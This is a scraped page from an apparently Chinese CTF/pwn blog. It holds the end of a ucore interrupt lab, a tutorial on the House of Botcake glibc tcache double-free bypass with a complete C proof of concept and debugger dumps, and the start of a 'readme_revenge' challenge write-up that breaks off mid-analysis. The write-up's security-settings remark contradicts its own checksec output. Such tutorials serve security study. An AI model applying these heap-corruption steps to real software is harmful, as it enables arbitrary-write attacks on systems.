<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE1:</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE2:</span><br><span class="line">        <span class="comment">/* do nothing */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// in kernel, it must be a mistake</span></span><br><span class="line">        <span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">            panic(<span class="string">&quot;unexpected trap in kernel.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line"><span class="meta">    (gate).gd_off_15_0 = (uint32_t)(off) &amp; 0xffff;        \</span></span><br><span class="line"><span class="meta">    (gate).gd_ss = (sel);                                \</span></span><br><span class="line"><span class="meta">    (gate).gd_args = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_rsv1 = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span></span><br><span class="line"><span class="meta">    (gate).gd_s = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_dpl = (dpl);                                \</span></span><br><span class="line"><span class="meta">    (gate).gd_p = 1;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_off_31_16 = (uint32_t)(off) &gt;&gt; 16;        \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>简单来说，就是要写一个“idt_init”函数来对中断向量表进行初始化，并且完善“trap_dispatch”函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">	    SETGATE(idt[i],<span class="number">0</span>,GD_KTEXT,__vectors[i],DPL_KERNEL);</span><br><span class="line">      <span class="comment">// 目标idt项为idt[i]</span></span><br><span class="line">      <span class="comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span></span><br><span class="line">      <span class="comment">// 中断处理程序的入口地址存放于__vectors[i]</span></span><br><span class="line">      <span class="comment">// 特权级为DPL_KERNEL</span></span><br><span class="line">	&#125;</span><br><span class="line">	SETGATE(idt[T_SWITCH_TOK],<span class="number">0</span>,GD_KTEXT,__vectors[T_SWITCH_TOK],DPL_USER);</span><br><span class="line">    <span class="comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span></span><br><span class="line">	lidt(&amp;idt_pd);</span><br><span class="line">    <span class="comment">// 加载该IDT</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER: <span class="comment">// 使操作系统每遇到100次时钟中断,就调用print_ticks子程序</span></span><br><span class="line">ticks++;</span><br><span class="line"><span class="keyword">if</span>(ticks%TICK_NUM == <span class="number">0</span>)</span><br><span class="line">	print_ticks();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  -check ticks:                              OK</span><br><span class="line">Total Score: <span class="number">10</span>/<span class="number">40</span></span><br><span class="line">make: *** [Makefile:<span class="number">241</span>：grade] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>基础分 10 分已经全部获得</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Botcake-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-06 14:38:15 / Modified: 14:40:02" itemprop="dateCreated datePublished" datetime="2022-04-06T14:38:15+08:00">2022-04-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Botcake"><a href="#House-Of-Botcake" class="headerlink" title="House Of Botcake"></a>House Of Botcake</h2><p>glibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 <strong>house of botcake</strong>，他的本质也是通过 <strong>UAF</strong> 来达到绕过的目的</p>
<p>利用场景：</p>
<ul>
<li>glibc &gt; 2.25（有 tcache）</li>
<li>double free</li>
</ul>
<hr>
<h2 id="glibc2-31下的Tcache检查"><a href="#glibc2-31下的Tcache检查" class="headerlink" title="glibc2.31下的Tcache检查"></a>glibc2.31下的Tcache检查</h2><p>对于每一个 tcache 中的chunk，增加了一个key指针，用于指向所属的 tcache 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>当chunk被放入时会设置key指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;  <span class="comment">//设置所属的tcache</span></span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//单链表头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class="line"> </span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//计数增加</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ptmalloc 使用了一种更机智的方法，在不影响效率的前提下，完成了对double free的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"><span class="comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span></span><br><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//剪枝</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put(p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说：</p>
<ul>
<li>在 free chunk 被放入 tcache 时，程序会设置一个 key 值</li>
<li>每次程序把 new free chunk 放入 tcache 前，都会检查一下它是否携带有 key 值</li>
<li>注意：key 值原本的位置是用户数据区（可以认为是随机值），有极小的概率会触发检查报错</li>
</ul>
<p>这些检查导致我们不能 free 任何一个已经在tcache中的chunk，绕过的方法有两个：</p>
<ul>
<li>想办法修改 key 字段</li>
<li>使用 fastbin double free</li>
</ul>
<h2 id="House-Of-Botcake-利用姿势"><a href="#House-Of-Botcake-利用姿势" class="headerlink" title="House Of Botcake 利用姿势"></a>House Of Botcake 利用姿势</h2><p>首先填充 tcache bin 链表，然后使用 malloc 从 tcache bin 链表中取出一个 chunk，然后通过二次 free 将 victim chunk 加入 tcache bin 链表，然后利用堆块重叠将 double free 块的fd指针覆写为目标位置，再次 malloc 即可控制到目标位置，达到任意写操作 </p>
<p>核心点为：</p>
<ul>
<li>合并 chunk1 chunk2 进 unsortedbins</li>
<li>将 chunk2 链进 tcache</li>
<li>从 chunk1 分配一个大chunk造成 overlapped 到 chunk2 修改其 fd </li>
</ul>
<p>其实就是利用了 tcachebin 和 unsortedbin 之间的相对独立性，使一个 chunk 在 unsortedbin 中的同时还可以在 tcachebin 中（fastbin对此就有相对完善的检查，不会出现这种情况）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;House of botcake Poc\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用缓冲并使_FILE_IO不影响堆</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目标地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;堆布局构造&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;为之后的合并申请一个 prev chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请用于double free的 victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请一个填充chunk防止top chunk合并.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来可以造成堆块重叠&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: 填充 tcache bin 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free victim chunk 并链接到 unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free prev chunk 使它和 victim chunk 合并.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;double free 利用完成\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tcache 毒化&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化&quot;</span>); </span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;将 victim chunk 的 fd 指针覆写为目标位置&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 这里只能直接修改,模拟覆盖的过程 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc申请到目标位置.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 位于 %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已控制目标位置!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Step 1: 填充 tcache bin 链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405d10</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>Step 2: free victim chunk 并链接到 unsorted bin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405f20</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405f20</span> <span class="comment">/* victim(head) */</span></span><br></pre></td></tr></table></figure>
<p>Step 3: free prev chunk 使它和 victim chunk 合并</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405e10</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405e10</span></span><br></pre></td></tr></table></figure>
<p>Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">6</span>]: <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 原本tcache的第一个chunk被申请了 */</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>Step 5: 将 victim chunk 的 fd 指针覆写为目标位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x7fffffffded0</span> —▸ <span class="number">0x400040</span> ◂— <span class="number">0x400000006</span></span><br></pre></td></tr></table></figure>
<p>虽然和 tcache Double free 的流程有些不同（先填满 tcache 然后再 fastbin 上进行 Double free，再次申请，使得 fast chunk 被链入 tcache），但最后都可以申请到目标地址</p>
<h2 id="版本对-House-Of-Botcake-的影响"><a href="#版本对-House-Of-Botcake-的影响" class="headerlink" title="版本对 House Of Botcake 的影响"></a>版本对 House Of Botcake 的影响</h2><p>House Of Botcake 就是为了对付高libc版本而产生的技术</p>
<p>至少在 libc-2.25 ~ libc-2.31 都可以适应</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/04/House%20Of%20Husk-statically-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/04/House%20Of%20Husk-statically-64/" class="post-title-link" itemprop="url">House Of Husk-statically-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-04 22:25:29 / Modified: 22:30:48" itemprop="dateCreated datePublished" datetime="2022-04-04T22:25:29+08:00">2022-04-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>readme_revenge 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./readme_revenge </span><br><span class="line">yhellow</span><br><span class="line">Hi, yhellow. Bye.</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   readme_revenge: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">2f</span>27d1b57237d1ab23f8d0fc3cd418994c5b443d, <span class="keyword">not</span> stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/readme_revenge&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>64位，statically，开了NX，有canary，Full RELRO</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">  <span class="built_in">printf</span>((__int64)<span class="string">&quot;Hi, %s. Bye.\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遇到了 statically 的程序（还挺少见的）</p>
<p><strong>入侵思路</strong></p>
<p>我的第一反应是它可能魔改了 “_isoc99_scanf” 或者 “printf”，这个题目看上去无懈可击，找不到任何的突破口</p>
<p>不妨开始一波逆向分析，想想题目作者把 flag 交到我们手里的手段：</p>
<ul>
<li>用 system 或者 execve 获取 shell</li>
<li>ORW直接读 flag</li>
</ul>
<p>常规的就这两种，因为这是 statically 程序并且没有 system，execve，所以直接排除第一种可能，那么程序就一定在某个位置写了“flag”字符串（用于open函数）</p>
<img src="/2022/04/04/House%20Of%20Husk-statically-64/1649058799273.png" class width="1649058799273"> 
<p>其中这一句比较可疑：</p>
